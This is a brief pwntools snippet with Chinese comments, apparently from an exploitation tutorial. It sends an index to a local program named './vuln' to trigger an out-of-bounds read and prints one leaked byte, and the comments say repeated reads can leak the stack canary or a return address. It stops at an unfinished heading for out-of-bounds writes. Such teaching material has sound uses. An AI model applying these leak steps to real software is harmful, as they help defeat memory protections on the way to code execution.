from pwn import *
# 假设目标程序有漏洞，发送index=0触发越界读
# 读取到的数据可能包含栈上的canary或返回地址
# 通过多次读取可以泄露地址
io = process('./vuln')
io.sendlineafter(b'index:', b'0')
leaked = io.recv(1) # 读取一个字节
print(hex(leaked[0]))


越界写利用：
python
